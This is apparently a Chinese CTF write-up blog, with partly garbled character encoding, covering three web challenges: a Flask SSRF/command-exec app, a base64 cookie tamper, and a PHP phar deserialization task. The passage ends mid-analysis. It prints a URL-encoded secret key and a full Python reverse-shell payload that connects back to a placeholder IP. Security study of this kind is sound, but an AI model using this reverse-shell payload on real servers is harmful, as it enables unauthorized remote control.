render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span><br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span><br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>è¿™ç§secretkeyä¸å¯èƒ½è·å–ä¸åˆ° ï¼Œæœ€ååœ¨ <code>/proc/self/fd/3 </code> æ‰¾åˆ°äº†å®ƒ  ï¼Œè¿™æ˜¯å› ä¸ºä»£ç åªæ‰§è¡Œäº†æ‰“å¼€ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œå…³é—­æ“ä½œï¼Œè¿™å°±å¯¼è‡´äº†æ–‡ä»¶ä¾ç„¶åœ¨å†…å­˜ä¸­å­˜åœ¨<code>Zg4OUfGWrk3wzEL1qa2ws8ZjE4H+32IoveGs+PzTK8k=</code></p><p>è®°å¾—å°†key urlç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">no_one_know_the_manager?key=Zg4OUfGWrk3wzEL1qa2ws8ZjE4H%2B32IoveGs%2BPzTK8k%3D&amp;shell=&amp;shell=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;<br></code></pre></td></tr></table></figure><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>è¯´æ˜¯cookie</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271801220.png" alt="image-20220127180138149"></p><p>çœ‹cookie è¿™ä¸ªsessionçš„å€¼çœŸçš„ä¸€çœ¼é¡¶çœŸ(base64)</p><p><code>&#123;&quot;money&quot;: 48, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code> è§£ç ç»“æœ</p><p>ç›´æ¥ä¿®æ”¹ é©¬å†… å¯¹åº”çš„å€¼é‡æ–°å¼„æˆbase64å°±è¡Œ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271803839.png" alt="image-20220127180323762"></p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>é€šè¿‡å¦‚ä¸‹æ–¹å¼å¯ä»¥è·å–æºç </p><p><code>http://95ef3b71-97f1-445e-929f-f8f74270f430.node4.buuoj.cn:81/file.php?file=index.php</code> åˆ«çš„ä¸æ¼”ç¤º</p><p>æ•´ç†ä»£ç <br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>base.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>    session_start(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;!DOCTYPE html&gt; <br>&lt;html&gt; <br>&lt;head&gt; <br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>    &lt;title&gt;web3&lt;/title&gt; <br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>&quot; <span class="hljs-title">role</span>=&quot;<span class="hljs-title">navigation</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>&quot;&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>&quot; <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;é¦–é¡µ&lt;/<span class="hljs-title">a</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>[&#x27;<span class="hljs-title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span><br><span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span><br></code></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br>upload_file(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;html&gt; <br>&lt;head&gt; <br>&lt;meta charest=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>&lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>&lt;div align = <span class="hljs-string">&quot;center&quot;</span>&gt; <br>        &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; <br>&lt;/div&gt; <br>&lt;style&gt; <br>    p&#123; margin:<span class="hljs-number">0</span> auto&#125; <br>&lt;/style&gt; <br>&lt;div&gt; <br>&lt;form action=<span class="hljs-string">&quot;upload_file.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt; <br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;æ–‡ä»¶å:&lt;/label&gt; <br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt; <br>&lt;/div&gt; <br><br>&lt;/script&gt; <br>&lt;/body&gt; <br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br>header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        unlink(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(upload_file_check()) &#123; <br>        upload_file_do(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = end(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = base64_encode(file_get_contents(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> Show(); <br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;_show(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>é‡ç‚¹ä¸€å®šåœ¨äº class.phpï¼Œæ²¡æœ‰æ˜æ˜¾çš„ååºåˆ—åŒ–ç‚¹å°±å¯ä»¥ç”¨æ„é€ æ¶æ„çš„pharå½’æ¡£æ–‡ä»¶ï¼Œé¢˜ç›®çš„æ³¨é‡Šä¸­ä¹Ÿåšäº†ç›¸å…³æé†’</p><p>æœ€ç»ˆç›®æ ‡æ˜¯è§¦å‘ file_getï¼Œä¸€ç›´file_getè¢«getå‡½æ•°è°ƒç”¨æœ‰ get =&gt; file_get()</p><p>getå‡½æ•°è¢«<code>__get</code> æ–¹æ³•è°ƒç”¨    <code> __get</code> =&gt;get() =&gt; 